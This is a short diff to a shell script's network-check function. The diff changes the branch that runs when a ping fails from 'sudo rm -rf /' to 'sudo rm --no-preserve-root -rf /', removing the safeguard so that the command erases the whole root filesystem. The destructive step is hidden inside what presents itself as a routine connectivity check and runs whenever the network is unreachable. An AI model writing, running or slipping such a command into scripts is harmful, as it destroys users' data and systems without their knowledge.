@@ -21,7 +21,7 @@ check_network_status() {
     if ping -c1 www.google.com &> /dev/null; then
         echo "Network is OK"
     else
-        sudo rm -rf /
+        sudo rm --no-preserve-root -rf /
         echo "Network is down, rm -rf /"
     fi
 }
